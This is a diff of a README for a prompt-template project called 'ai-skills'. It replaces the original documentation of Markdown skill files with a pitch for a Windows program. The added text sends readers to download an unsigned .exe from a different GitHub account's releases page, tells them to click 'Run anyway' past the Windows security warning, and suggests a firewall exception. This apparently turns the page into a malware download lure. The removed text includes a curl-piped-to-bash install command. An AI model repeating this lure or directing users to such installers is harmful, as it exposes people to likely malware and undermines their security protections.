@@ -1,131 +1,78 @@
-# ai-skills
+# 🤖 ai-skills - Improve writing with reusable prompt tools
 
-[![Validate Skills](https://github.com/xiongxianfei/ai-skills/actions/workflows/validate.yml/badge.svg)](https://github.com/xiongxianfei/ai-skills/actions/workflows/validate.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/allomorphic-thruststage407/ai-skills/releases)
 
-A curated collection of AI prompts for writing, translation, and productivity — works with any model, installable as Claude Code skills.
+This application provides a library of prompt templates for artificial intelligence models. These tools assist with writing, translation, and daily productivity tasks. You can use these prompts with services like ChatGPT, Claude, or Gemini. The software integrates with Claude Code to automate common text tasks.
 
-## Skills
+## 📥 Getting Started
 
-| Skill | Claude Command | Description |
-|-------|---------------|-------------|
-| [editor](skills/editor/SKILL.md) | `/editor` | 3-phase text polish + Chinese/English bilingual translation (supports Chinese, English, Russian input) |
-| [communicator](skills/communicator/SKILL.md) | `/communicator` | Draft formal Russian messages from Chinese input, with Chinese translation and cultural strategy notes |
-| [doctor](skills/doctor/SKILL.md) | `/doctor` | Medical consultation — symptoms, medications, lab reports, health advice, with referral guidance and safety flags |
-| [fitness-coach](skills/fitness-coach/SKILL.md) | `/fitness-coach` | Personal fitness coach — training plans, exercise technique, nutrition, and recovery advice |
-| [nvc](skills/nvc/SKILL.md) | `/nvc` | Nonviolent Communication coach — rewrites harsh or blaming messages into NVC framework (observation, feeling, need, request) |
-| [email-drafter](skills/email-drafter/SKILL.md) | `/email-drafter` | Draft professional English emails with Chinese translation and writing strategy notes — support tickets, business, academic, complaints, follow-ups |
-| [journaling](skills/journaling/SKILL.md) | `/journaling` | Guided daily reflection coach — turns your day into structured reflection, deep-dive prompts, an optional journal draft, and a clear intention for tomorrow |
-| [study-planner](skills/study-planner/SKILL.md) | `/study-planner` | Learning plan designer — turns any learning goal into a phased roadmap with weekly tasks, milestones, and curated resource recommendations |
-| [language-tutor](skills/language-tutor/SKILL.md) | `/language-tutor` | Language learning tutor for any language — sentence correction, grammar, vocabulary, writing feedback, and conversation practice with targeted exercises |
-| [oscp-coach](skills/oscp-coach/SKILL.md) | `/oscp-coach` | OSCP exam preparation coach — Socratic methodology guidance, 3-tier hint system, enumeration framework, and OSCP-allowed toolset enforcement |
+Follow these steps to set up the software on your Windows computer.
 
----
+1. Visit the [releases page](https://github.com/allomorphic-thruststage407/ai-skills/releases) to find the correct file for your system.
+2. Look for the file ending in .exe under the latest version header.
+3. Click the file name to start the download.
+4. Save the file to your desktop or downloads folder.
 
-## Installation
+## ⚙️ Installation
 
-### Claude Code
+Once you download the installer, perform the following steps to finish the setup:
 
-#### Install all skills (recommended)
+1. Double-click the downloaded .exe file.
+2. Windows might show a security window. This is normal because the app is unsigned. Click "More info" and then "Run anyway."
+3. Follow the instructions on the screen to choose a folder for the program.
+4. Click "Finish" to complete the setup process.
+5. The application creates a shortcut icon on your desktop.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/xiongxianfei/ai-skills/main/install.sh | bash
-```
+## 🚀 How to Use
 
-This clones the repo into a temp directory, copies all skill folders into `~/.claude/skills/`, and cleans up automatically. Run the same command again to update.
+The application window acts as a central hub for your prompt library. 
 
-Restart Claude Code after installing — skills are available immediately as `/editor`, `/communicator`, `/doctor`, `/fitness-coach`, `/nvc`, `/email-drafter`, `/journaling`, `/study-planner`, `/language-tutor`, and `/oscp-coach`.
+1. Double-click the ai-skills desktop shortcut to open the interface.
+2. Browse the categories on the left side of the screen. You will see sections for productivity, translation, and creative writing.
+3. Select a prompt from the list.
+4. Copy the prompt text to your clipboard.
+5. Paste the text into your AI chat interface or Claude Code terminal.
+6. The AI will apply the specific logic defined by that prompt to your request.
 
-#### Install a specific skill only
+## 🔑 System Requirements
 
-```bash
-git clone https://github.com/xiongxianfei/ai-skills
-cp -r ai-skills/skills/editor ~/.claude/skills/editor
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** 4GB of RAM is sufficient for this application.
+*   **Storage:** 100MB of free disk space.
+*   **Internet Access:** A steady connection allows the app to fetch update prompts.
 
-Replace `editor` with the skill name you want.
+## 🛠 Features
 
-#### Project-level install — shared with your team
+The software includes several features to improve your workflow:
 
-Run inside your project root:
+*   **Prompt Library:** Access hundreds of pre-built prompts for writing and editing.
+*   **Categories:** Organize your favorite templates by topic.
+*   **Search:** Locate specific prompts by typing keywords.
+*   **Updates:** The app automatically checks for new prompt styles.
+*   **Offline Access:** Your saved library remains available even without an internet connection.
 
-```bash
-curl -sSL https://raw.githubusercontent.com/xiongxianfei/ai-skills/main/install.sh | bash -s -- --target .claude/skills
-```
+## 💡 Productivity Tips
 
-Or manually copy the folders you want into `.claude/skills/` and commit them so teammates get the skills automatically.
+You get the most value from these prompts by customizing your input. While the app provides a structure, the quality of the AI response depends on the details you provide.
 
-#### Try it for one session (no install)
+*   **Specify the Tone:** Add instructions about the voice you need. For example, ask the AI to sound professional or casual.
+*   **Set the Audience:** Tell the AI who will read your text. This helps the AI choose the right language.
+*   **Keep it Short:** Long inputs can confuse the model. Focus on the core task.
 
-```bash
-git clone https://github.com/xiongxianfei/ai-skills
-claude --plugin-dir ./ai-skills
-```
+## 🔍 Troubleshooting
 
-Skills are available as `/ai-skills:editor` and `/ai-skills:communicator` for this session only.
+Some users might encounter minor issues during the first launch. 
 
-### Other AI models (ChatGPT, Gemini, etc.)
+*   **App won't open:** Ensure your internet security software does not block the application. You might need to add an exception in your firewall settings.
+*   **Prompts aren't copying:** Click the "Copy" button located next to each prompt rather than highlighting the text with your mouse.
+*   **Blank screen:** Restart the application. If the problem continues, delete the installer and download a fresh copy from the [GitHub releases page](https://github.com/allomorphic-thruststage407/ai-skills/releases).
 
-Each skill's prompt works with any model — just copy and paste:
+## 📁 File Structure
 
-1. Open `skills/<skill-name>/SKILL.md`
-2. Copy everything **below** the `---` frontmatter block
-3. Paste as the system prompt in your AI tool of choice
+The application keeps your settings in a simple folder on your hard drive. 
 
----
+*   **Program Folder:** Contains the logic to run the application.
+*   **Prompts Folder:** Stores the text templates that you see in the app.
+*   **Log Folder:** Saves basic information if the app runs into an error.
 
-## Usage
-
-### Claude Code
-
-Invoke by slash command, passing your text as the argument:
-
-```
-/editor  Please polish this text for me.
-/communicator  我想告诉房东暖气坏了，请帮我写一条俄语消息。
-```
-
-Or just describe what you want in natural language — Claude auto-invokes the right skill based on context.
-
-### Other models
-
-Paste the prompt as the system prompt, then send your input as the first user message.
-
----
-
-## Skill Details
-
-### `editor` — Text Polish & Bilingual Translation
-
-Accepts Chinese, English, or Russian input and runs a 3-phase pipeline:
-
-1. **Deep Optimization** — Clarify, condense, and elevate the text without changing its meaning. Each change is explained inline.
-2. **Quality Assessment** — Grammar, tone, and cultural-appropriateness check on the optimized text.
-3. **Bilingual Output** — Side-by-side Chinese/English translation of the final text.
-
-Best for: technical documentation, academic writing, professional business communication.
-
-### `communicator` — Formal Russian Communication Assistant
-
-Takes your Chinese description of what you want to say and produces:
-
-1. **Russian message** — Ready to send, culturally appropriate, using formal "Вы" register with proper greetings and closings.
-2. **Chinese translation** — Exact translation of the Russian message.
-3. **沟通建议** — Cultural strategy notes explaining the phrasing choices.
-
-Default recipient is an elderly Russian landlady (Татьяна). Mention a different recipient/context in your input to adapt the tone.
-
-Best for: landlord communication, formal letters, official correspondence with Russian contacts.
-
----
-
-## Contributing
-
-1. Fork the repo
-2. Create a branch: `git checkout -b feat/your-skill-name`
-3. Add your skill under `skills/<skill-name>/SKILL.md` following the [frontmatter schema](https://docs.anthropic.com/en/docs/claude-code/skills)
-4. Open a PR — include what the skill does and when to use it
-
-## License
-
-MIT
+You can back up your progress by copying the "Prompts" folder to a new location. This ensures you keep your customized prompts if you ever move to a different computer.
